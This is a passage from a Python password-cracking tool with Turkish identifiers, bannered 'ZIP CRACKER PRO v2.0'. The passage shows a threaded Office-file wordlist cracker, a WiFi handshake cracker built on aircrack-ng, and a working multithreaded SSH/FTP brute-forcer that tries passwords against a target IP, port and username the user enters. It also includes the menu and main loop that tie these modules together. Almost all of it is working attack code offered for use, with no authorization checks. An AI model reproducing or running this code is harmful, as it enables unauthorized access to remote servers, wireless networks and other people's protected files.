            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Desteklenmeyen dosya türü: {self.office_dosyasi}{RenkliYazi.SON}")
            return False

        if not self._sifreleri_oku():
            return False

        print(f"{RenkliYazi.SARI}[*] Office şifre kırma işlemi başlatılıyor...")
        print(f"[*] Hedef dosya: {self.office_dosyasi}")
        print(f"[*] Thread sayısı: {self.thread_sayisi}{RenkliYazi.SON}")

        self.baslangic_zamani = time.time()
        
        with ThreadPoolExecutor(max_workers=self.thread_sayisi) as executor:
            futures = [executor.submit(self._office_sifre_dene, sifre) for sifre in self.tum_sifreler_listesi]
            for future in futures:
                if self.bulunan_sifre:
                    executor.shutdown(wait=False)
                    break

        bitis_zamani = time.time()
        toplam_sure = bitis_zamani - self.baslangic_zamani
        
        print(f"\n{RenkliYazi.SARI}[*] İşlem tamamlandı!")
        print(f"[*] Toplam geçen süre: {format_sure(toplam_sure)}")
        if toplam_sure > 0:
            print(f"[*] Ortalama hız: {self.denenen_sayisi/toplam_sure:.2f} şifre/saniye{RenkliYazi.SON}")

        return self.bulunan_sifre is not None

class WiFiSifreKirici:
    def __init__(self, handshake_dosyasi):
        self.handshake_dosyasi = handshake_dosyasi
        self.sifre_dosyasi = "sifreler.txt"
        self.bulunan_sifre = None
        self.baslangic_zamani = None

    def _kontrol_aircrack(self):
        try:
            subprocess.run(["which", "aircrack-ng"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
            return True
        except subprocess.CalledProcessError:
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: aircrack-ng yüklü değil!")
            print(f"[!] Yüklemek için:")
            print(f"[!] macOS: brew install aircrack-ng")
            print(f"[!] Linux: sudo apt-get install aircrack-ng")
            print(f"[!] veya: sudo yum install aircrack-ng{RenkliYazi.SON}")
            return False

    def kirmayi_baslat(self):
        if not os.path.exists(self.handshake_dosyasi):
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Handshake dosyası bulunamadı: {self.handshake_dosyasi}{RenkliYazi.SON}")
            return False

        if not os.path.exists(self.sifre_dosyasi):
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Şifre listesi dosyası bulunamadı: {self.sifre_dosyasi}{RenkliYazi.SON}")
            return False

        if not self._kontrol_aircrack():
            return False

        print(f"{RenkliYazi.SARI}[*] WiFi şifre kırma işlemi başlatılıyor...")
        print(f"[*] Hedef dosya: {self.handshake_dosyasi}")
        print(f"[*] Wordlist: {self.sifre_dosyasi}{RenkliYazi.SON}")

        self.baslangic_zamani = time.time()
        
        try:
            cmd = ["aircrack-ng", "-w", self.sifre_dosyasi, self.handshake_dosyasi]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    line = output.strip()
                    
                    if "Tested" in line:
                        sys.stdout.write(f"\r{RenkliYazi.BEYAZ}{line}{RenkliYazi.SON}")
                        sys.stdout.flush()
                    
                    if "KEY FOUND!" in line:
                        sifre_match = re.search(r"KEY FOUND! \[ (.*?) \]", line)
                        if sifre_match:
                            self.bulunan_sifre = sifre_match.group(1)
                            print(f"\n{RenkliYazi.YESIL}[+] Şifre bulundu: {self.bulunan_sifre}{RenkliYazi.SON}")
            
            process.wait()
            
            bitis_zamani = time.time()
            toplam_sure = bitis_zamani - self.baslangic_zamani
            
            print(f"\n{RenkliYazi.SARI}[*] İşlem tamamlandı!")
            print(f"[*] Toplam geçen süre: {format_sure(toplam_sure)}{RenkliYazi.SON}")
            
            return self.bulunan_sifre is not None
            
        except Exception as e:
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: {str(e)}{RenkliYazi.SON}")
            return False

class SSHFTPBruteForcer:
    def __init__(self, hedef_ip, port, kullanici_adi, servis_turu="ssh", thread_sayisi=5):
        self.hedef_ip = hedef_ip
        self.port = port
        self.kullanici_adi = kullanici_adi
        self.servis_turu = servis_turu.lower()
        self.thread_sayisi = thread_sayisi
        self.sifre_dosyasi = "sifreler.txt"
        self.bulunan_sifre = None
        self.tum_sifreler_listesi = []
        self.denenen_sayisi = 0
        self.toplam_sifre = 0
        self.baslangic_zamani = None
        self.lock = threading.Lock()

    def _sifreleri_oku(self):
        try:
            with open(self.sifre_dosyasi, "r", encoding="utf-8") as f:
                self.tum_sifreler_listesi = [line.strip() for line in f if line.strip()]
            self.toplam_sifre = len(self.tum_sifreler_listesi)
            print(f"{RenkliYazi.SARI}[*] '{self.sifre_dosyasi}' dosyasından {self.toplam_sifre} adet şifre okundu.{RenkliYazi.SON}")
            return True
        except Exception as e:
            print(f"{RenkliYazi.KIRMIZI}[!] Hata: Şifre dosyası ('{self.sifre_dosyasi}') okunurken hata oluştu: {str(e)}{RenkliYazi.SON}")
            return False

    def _ssh_sifre_dene(self, sifre):
        if self.bulunan_sifre:
            return False

        with self.lock:
            self.denenen_sayisi += 1
            mevcut_denenen = self.denenen_sayisi
            
            if mevcut_denenen % 10 == 0 or mevcut_denenen == self.toplam_sifre:
                gecen_sure = time.time() - self.baslangic_zamani
                hiz = mevcut_denenen / gecen_sure if gecen_sure > 0 else 0
                kalan_sifre = self.toplam_sifre - mevcut_denenen
                tahmini_kalan_sure = kalan_sifre / hiz if hiz > 0 else 0
                
                print(f"\r{RenkliYazi.BEYAZ}İlerleme: {get_progress_bar(int(mevcut_denenen/self.toplam_sifre*100))} "
                      f"[{mevcut_denenen}/{self.toplam_sifre}] "
                      f"Hız: {hiz:.2f} ş/s "
                      f"ETR: {format_sure(tahmini_kalan_sure)}{RenkliYazi.SON}", end="")
                sys.stdout.flush()

        try:
            if self.servis_turu == "ssh":
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.hedef_ip, port=self.port, username=self.kullanici_adi, password=sifre, timeout=5)
                ssh.close()
                basarili = True
            else:  # FTP
                ftp = ftplib.FTP()
                ftp.connect(self.hedef_ip, self.port, timeout=5)
                ftp.login(self.kullanici_adi, sifre)
                ftp.quit()
                basarili = True

            if basarili:
                with self.lock:
                    if not self.bulunan_sifre:
                        self.bulunan_sifre = sifre
                        print(f"\n{RenkliYazi.YESIL}[+] Şifre bulundu: {sifre}{RenkliYazi.SON}")
                        print(f"{RenkliYazi.YESIL}[+] Denenen şifre sayısı: {self.denenen_sayisi}{RenkliYazi.SON}")
                return True

        except (paramiko.AuthenticationException, ftplib.error_perm):
            return False
        except (socket.timeout, paramiko.SSHException, ftplib.error_temp, ConnectionRefusedError) as e:
            with self.lock:
                print(f"\n{RenkliYazi.SARI}[!] Bağlantı hatası: {str(e)}{RenkliYazi.SON}")
            return False
        except Exception as e:
            with self.lock:
                print(f"\n{RenkliYazi.KIRMIZI}[!] Beklenmeyen hata: {str(e)}{RenkliYazi.SON}")
            return False

    def kirmayi_baslat(self):
        if not self._sifreleri_oku():
            return False

        print(f"{RenkliYazi.SARI}[*] {self.servis_turu.upper()} brute force saldırısı başlatılıyor...")
        print(f"[*] Hedef: {self.hedef_ip}:{self.port}")
        print(f"[*] Kullanıcı adı: {self.kullanici_adi}")
        print(f"[*] Thread sayısı: {self.thread_sayisi}{RenkliYazi.SON}")

        self.baslangic_zamani = time.time()
        
        with ThreadPoolExecutor(max_workers=self.thread_sayisi) as executor:
            futures = [executor.submit(self._ssh_sifre_dene, sifre) for sifre in self.tum_sifreler_listesi]
            for future in futures:
                if self.bulunan_sifre:
                    executor.shutdown(wait=False)
                    break

        bitis_zamani = time.time()
        toplam_sure = bitis_zamani - self.baslangic_zamani
        
        print(f"\n{RenkliYazi.SARI}[*] İşlem tamamlandı!")
        print(f"[*] Toplam geçen süre: {format_sure(toplam_sure)}")
        if toplam_sure > 0:
            print(f"[*] Ortalama hız: {self.denenen_sayisi/toplam_sure:.2f} şifre/saniye{RenkliYazi.SON}")

        return self.bulunan_sifre is not None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    banner = f"""{RenkliYazi.YESIL}
    /\___/\  
   (  o o  )  ZIP CRACKER PRO v2.0
   (  =^=  ) 
    (--m-m--)
    
    [ Cat Tools ]{RenkliYazi.SON}
    """
    print(banner)

def display_menu():
    print(f"\n{RenkliYazi.SARI}[*] Ana Menü:{RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}1) Şifre Listesi Oluştur{RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}2) Arşiv Şifre Kır (ZIP/RAR/7Z/TAR){RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}3) PDF Şifre Kır{RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}4) Office Şifre Kır (Word/Excel/PowerPoint){RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}5) WiFi Handshake Şifre Kır{RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}6) SSH/FTP Brute Force{RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}7) Çıkış{RenkliYazi.SON}")
    
    while True:
        try:
            secim = input(f"\n{RenkliYazi.PEMBE}[?] Seçiminiz (1-7): {RenkliYazi.SON}")
            if secim in ['1', '2', '3', '4', '5', '6', '7']:
                return secim
            print(f"{RenkliYazi.SARI}[!] Lütfen 1-7 arasında bir seçim yapın.{RenkliYazi.SON}")
        except KeyboardInterrupt:
            print(f"\n{RenkliYazi.SARI}[!] Program sonlandırılıyor...{RenkliYazi.SON}")
            sys.exit(0)

def check_wordlist():
    if not os.path.exists("sifreler.txt"):
        print(f"{RenkliYazi.SARI}\n[!] Uyarı: Şifre listesi bulunamadı!{RenkliYazi.SON}")
        print(f"{RenkliYazi.SARI}[!] Lütfen önce şifre listesi oluşturun (Seçenek 1).{RenkliYazi.SON}")
        input(f"\n{RenkliYazi.SARI}[*] Devam etmek için Enter tuşuna basın...{RenkliYazi.SON}")
        return False
    return True

def pdf_sifre_kir():
    print(f"{RenkliYazi.SARI}\n[*] PDF Şifre Kırma Modülü{RenkliYazi.SON}")
    
    pdf_dosyalari = get_pdf_targets_interactively()
    if not pdf_dosyalari:
        print(f"{RenkliYazi.SARI}[!] Hedef PDF dosyası seçilmedi.{RenkliYazi.SON}")
        return

    for pdf_dosyasi in pdf_dosyalari:
        kirici = PDFSifreKirici(pdf_dosyasi)
        kirici.kirmayi_baslat()

def office_sifre_kir():
    print(f"{RenkliYazi.SARI}\n[*] Office Şifre Kırma Modülü{RenkliYazi.SON}")
    
    office_dosyalari = get_office_targets_interactively()
    if not office_dosyalari:
        print(f"{RenkliYazi.SARI}[!] Hedef Office dosyası seçilmedi.{RenkliYazi.SON}")
        return

    for office_dosyasi in office_dosyalari:
        kirici = OfficeSifreKirici(office_dosyasi)
        kirici.kirmayi_baslat()

def wifi_sifre_kir():
    print(f"{RenkliYazi.SARI}\n[*] WiFi Handshake Şifre Kırma Modülü{RenkliYazi.SON}")
    
    wifi_dosyalari = get_wifi_targets_interactively()
    if not wifi_dosyalari:
        print(f"{RenkliYazi.SARI}[!] Hedef handshake dosyası seçilmedi.{RenkliYazi.SON}")
        return

    for wifi_dosyasi in wifi_dosyalari:
        kirici = WiFiSifreKirici(wifi_dosyasi)
        kirici.kirmayi_baslat()

def ssh_ftp_brute_force():
    print(f"{RenkliYazi.SARI}\n[*] SSH/FTP Brute Force Modülü{RenkliYazi.SON}")
    
    while True:
        servis = input(f"{RenkliYazi.PEMBE}Servis türünü seçin (ssh/ftp): {RenkliYazi.SON}").strip().lower()
        if servis in ["ssh", "ftp"]:
            break
        print(f"{RenkliYazi.KIRMIZI}[!] Geçersiz servis türü. 'ssh' veya 'ftp' seçin.{RenkliYazi.SON}")
    
    hedef_ip = input(f"{RenkliYazi.PEMBE}Hedef IP adresi: {RenkliYazi.SON}").strip()
    try:
        port = int(input(f"{RenkliYazi.PEMBE}Port numarası ({22 if servis == 'ssh' else 21}): {RenkliYazi.SON}").strip() or (22 if servis == "ssh" else 21))
    except ValueError:
        print(f"{RenkliYazi.SARI}[!] Geçersiz port numarası. Varsayılan port kullanılacak.{RenkliYazi.SON}")
        port = 22 if servis == "ssh" else 21
    
    kullanici_adi = input(f"{RenkliYazi.PEMBE}Kullanıcı adı: {RenkliYazi.SON}").strip()
    if not kullanici_adi:
        print(f"{RenkliYazi.KIRMIZI}[!] Kullanıcı adı boş olamaz.{RenkliYazi.SON}")
        return
    
    try:
        thread_sayisi = int(input(f"{RenkliYazi.PEMBE}Thread sayısı (varsayılan: 5): {RenkliYazi.SON}").strip() or "5")
    except ValueError:
        print(f"{RenkliYazi.SARI}[!] Geçersiz thread sayısı. Varsayılan değer (5) kullanılacak.{RenkliYazi.SON}")
        thread_sayisi = 5
    
    kirici = SSHFTPBruteForcer(hedef_ip, port, kullanici_adi, servis, thread_sayisi)
    kirici.kirmayi_baslat()

def get_archive_targets_interactively():
    arsiv_hedef_dosyalar_temp = []
    hedef_yollar_kaynagi = None
    desteklenen_uzantilar = [".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".tgz", ".tar.gz", ".tbz2", ".tar.bz2"]

    print(f"{RenkliYazi.SARI}\n[*] Hedef Arşiv Dosyası/Klasörü Belirleme{RenkliYazi.SON}")
    print(f"{RenkliYazi.BEYAZ}Desteklenen formatlar: {', '.join(desteklenen_uzantilar)}{RenkliYazi.SON}")
    
    while True:
        girdi = input(f"{RenkliYazi.PEMBE}Lütfen hedef arşiv dosyalarının yollarını (virgül veya boşlukla ayırarak) VEYA taranacak TEK bir klasörün yolunu girin: {RenkliYazi.SON}").strip()
        if girdi:
            if ',' in girdi or ' ' in girdi.strip():
                if ',' in girdi:
                    hedef_yollar_kaynagi = [p.strip() for p in girdi.split(',') if p.strip()]
                else:
                    hedef_yollar_kaynagi = [p.strip() for p in girdi.split(' ') if p.strip()]
            else:
                hedef_yollar_kaynagi = [girdi]
            
            if hedef_yollar_kaynagi:
                break
        print(f"{RenkliYazi.KIRMIZI}[!] Geçerli bir yol girmediniz. Lütfen tekrar deneyin.{RenkliYazi.SON}")

    if hedef_yollar_kaynagi:
        for hedef_yol in hedef_yollar_kaynagi:
            if len(hedef_yollar_kaynagi) == 1 and os.path.isdir(hedef_yol):
                print(f"{RenkliYazi.SARI}[*] '{hedef_yol}' klasöründeki arşiv dosyaları taranıyor...{RenkliYazi.SON}")
                for root, _, files in os.walk(hedef_yol):
                    for file_name in files:
                        if any(file_name.lower().endswith(ext) for ext in desteklenen_uzantilar):
                            arsiv_hedef_dosyalar_temp.append(os.path.join(root, file_name))
                if arsiv_hedef_dosyalar_temp:
                    print(f"{RenkliYazi.SARI}[+] {len(arsiv_hedef_dosyalar_temp)} adet arşiv dosyası bulundu ve eklendi.{RenkliYazi.SON}")
                else:
                    print(f"{RenkliYazi.SARI}[!] '{hedef_yol}' klasöründe desteklenen arşiv dosyası bulunamadı.{RenkliYazi.SON}")
            elif os.path.isfile(hedef_yol):
                if any(hedef_yol.lower().endswith(ext) for ext in desteklenen_uzantilar):
                    arsiv_hedef_dosyalar_temp.append(os.path.abspath(hedef_yol))
                else:
                    print(f"{RenkliYazi.SARI}[!] '{hedef_yol}' desteklenen bir arşiv formatında değil. Atlanıyor...{RenkliYazi.SON}")
            elif not os.path.isdir(hedef_yol):
                print(f"{RenkliYazi.KIRMIZI}[!] Geçersiz hedef: '{hedef_yol}'. Bir dosya veya klasör olmalı. Atlanıyor...{RenkliYazi.SON}")

    if not arsiv_hedef_dosyalar_temp:
        return []
    
    final_targets = sorted(list(set(arsiv_hedef_dosyalar_temp)))
    print(f"{RenkliYazi.SARI}[*] Toplam {len(final_targets)} adet benzersiz arşiv hedefi belirlendi.{RenkliYazi.SON}")
    return final_targets

def get_pdf_targets_interactively():
    pdf_hedef_dosyalar = []
    print(f"{RenkliYazi.SARI}\n[*] Hedef PDF Dosyası Seçimi{RenkliYazi.SON}")
    
    while True:
        girdi = input(f"{RenkliYazi.PEMBE}PDF dosyasının yolunu girin (iptal için boş bırakın): {RenkliYazi.SON}").strip()
        if not girdi:
            break
            
        if os.path.isfile(girdi) and girdi.lower().endswith('.pdf'):
            pdf_hedef_dosyalar.append(os.path.abspath(girdi))
            print(f"{RenkliYazi.SARI}[+] PDF dosyası eklendi: {girdi}{RenkliYazi.SON}")
        else:
            print(f"{RenkliYazi.KIRMIZI}[!] Geçersiz PDF dosyası: {girdi}{RenkliYazi.SON}")
    
    return pdf_hedef_dosyalar

def get_office_targets_interactively():
    office_hedef_dosyalar = []
    desteklenen_uzantilar = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx']
    
    print(f"{RenkliYazi.SARI}\n[*] Hedef Office Dosyası Seçimi")
    print(f"[*] Desteklenen formatlar: {', '.join(desteklenen_uzantilar)}{RenkliYazi.SON}")
    
    while True:
        girdi = input(f"{RenkliYazi.PEMBE}Office dosyasının yolunu girin (iptal için boş bırakın): {RenkliYazi.SON}").strip()
        if not girdi:
            break
            
        if os.path.isfile(girdi) and any(girdi.lower().endswith(ext) for ext in desteklenen_uzantilar):
            office_hedef_dosyalar.append(os.path.abspath(girdi))
            print(f"{RenkliYazi.SARI}[+] Office dosyası eklendi: {girdi}{RenkliYazi.SON}")
        else:
            print(f"{RenkliYazi.KIRMIZI}[!] Geçersiz Office dosyası: {girdi}{RenkliYazi.SON}")
    
    return office_hedef_dosyalar

def get_wifi_targets_interactively():
    wifi_hedef_dosyalar = []
    desteklenen_uzantilar = ['.cap', '.pcap', '.hccap', '.hccapx']
    
    print(f"{RenkliYazi.SARI}\n[*] Hedef WiFi Handshake Dosyası Seçimi")
    print(f"[*] Desteklenen formatlar: {', '.join(desteklenen_uzantilar)}{RenkliYazi.SON}")
    
    while True:
        girdi = input(f"{RenkliYazi.PEMBE}Handshake dosyasının yolunu girin (iptal için boş bırakın): {RenkliYazi.SON}").strip()
        if not girdi:
            break
            
        if os.path.isfile(girdi) and any(girdi.lower().endswith(ext) for ext in desteklenen_uzantilar):
            wifi_hedef_dosyalar.append(os.path.abspath(girdi))
            print(f"{RenkliYazi.SARI}[+] Handshake dosyası eklendi: {girdi}{RenkliYazi.SON}")
        else:
            print(f"{RenkliYazi.KIRMIZI}[!] Geçersiz handshake dosyası: {girdi}{RenkliYazi.SON}")
    
    return wifi_hedef_dosyalar

def main():
    try:
        while True:
            clear_screen()
            display_banner()
            secim = display_menu()
            
            if secim == '1':
                sifre_olusturucu = SifreOlusturucu()
                sifre_olusturucu.calistir_sifre_olusturucu()
                input(f"\n{RenkliYazi.SARI}[*] Devam etmek için Enter tuşuna basın...{RenkliYazi.SON}")
            
            elif secim == '2':
                if not check_wordlist():
                    continue
                arsiv_dosyalari = get_archive_targets_interactively()
                if arsiv_dosyalari:
                    kirici = ArsivSifreKirici(arsiv_dosyalari)
                    kirici.kirma_baslat()
                input(f"\n{RenkliYazi.SARI}[*] Devam etmek için Enter tuşuna basın...{RenkliYazi.SON}")
            
            elif secim == '3':
                if not check_wordlist():
                    continue
                pdf_sifre_kir()
                input(f"\n{RenkliYazi.SARI}[*] Devam etmek için Enter tuşuna basın...{RenkliYazi.SON}")
            
            elif secim == '4':
                if not check_wordlist():
                    continue
                office_sifre_kir()
                input(f"\n{RenkliYazi.SARI}[*] Devam etmek için Enter tuşuna basın...{RenkliYazi.SON}")
            
            elif secim == '5':
                if not check_wordlist():
                    continue
                wifi_sifre_kir()
                input(f"\n{RenkliYazi.SARI}[*] Devam etmek için Enter tuşuna basın...{RenkliYazi.SON}")
            
            elif secim == '6':
                if not check_wordlist():
                    continue
                ssh_ftp_brute_force()
                input(f"\n{RenkliYazi.SARI}[*] Devam etmek için Enter tuşuna basın...{RenkliYazi.SON}")
            
            elif secim == '7':
                print(f"\n{RenkliYazi.YESIL}[+] Program sonlandırılıyor...{RenkliYazi.SON}")
                break

    except KeyboardInterrupt:
        print(f"\n{RenkliYazi.SARI}[!] Program sonlandırılıyor...{RenkliYazi.SON}")
        sys.exit(0)

if __name__ == "__main__":
    main() 